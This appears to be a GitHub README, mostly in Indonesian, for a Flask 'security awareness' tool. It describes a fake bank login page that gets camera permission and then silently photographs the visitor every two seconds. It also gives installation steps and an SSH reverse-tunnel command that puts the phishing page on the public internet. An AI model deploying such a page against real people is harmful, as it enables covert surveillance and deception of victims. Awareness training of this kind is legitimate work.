# 🛡️ Project: Silent Camera Capture (Security Awareness Demo)

![Python](https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python)
![Flask](https://img.shields.io/badge/Flask-Framework-lightgrey?style=for-the-badge&logo=flask)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Security](https://img.shields.io/badge/Security-Educational-red?style=for-the-badge)

---

## 📖 Overview
Proyek ini adalah alat simulasi untuk **Security Awareness Training**. Tujuannya adalah mendemonstrasikan betapa mudahnya penjahat siber mencuri data privasi (dalam hal ini akses kamera) melalui teknik **Social Engineering** dan **Phishing**.

---

## 📺 Support the Channel
[![AsroyxCySec YouTube Banner](https://img.shields.io/badge/Youtube-Subscribe%20AsroyxCySec-red?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@AsroyxCySec)

> **Mau konten lebih dalam tentang Cyber Security?**  Support Kanal YouTube kita buat konten edukasi menarik lainnya:  
> 👉 **[AsroyxCySec YouTube Channel](https://www.youtube.com/@AsroyxCySec)**

---


> **⚠️ DISCLAIMER:**  Proyek ini dibuat murni untuk tujuan edukasi dan pelatihan keamanan siber. Penyalahgunaan alat ini untuk kegiatan ilegal di luar lingkungan lab/training adalah tanggung jawab pengguna sepenuhnya. 

## Cara Kerja
1. User mengunjungi website yang menyerupai halaman login bank.
2. Saat user melakukan interaksi pertama (klik/ketik), browser akan meminta izin akses kamera.
3. Jika user memberikan izin ("Allow"), skrip akan menangkap foto wajah setiap 2 detik secara diam-diam.
4. Foto dikirim ke server backend dan disimpan di folder `captured_faces/`.

## Cara Instalasi & Menjalankan

### Prasyarat
- Python 3.x
- Webcam aktif

### Langkah-langkah (Linux/Mac/Windows)
1. Clone repository ini:
   ```bash
   git clone https://github.com/asroyxCySec/project-security-demo.git
   cd project-security-demo
   ```

2. Buat dan aktifkan Virtual Environment:
    ```bash
   python -m venv venv
   # Mac/Linux:
   source venv/bin/activate
   # Windows:
   .\venv\Scripts\activate
   ```

3. Install dependencies::
    ```bash
    pip install -r requirements.txt
    ```


4. Jalankan tools:
    ```bash
    python app.py
    ```
    
5. Pakai Tunnel
   ```bash
   ssh -p 443 -R0:localhost:5000 a.pinggy.io
   ```
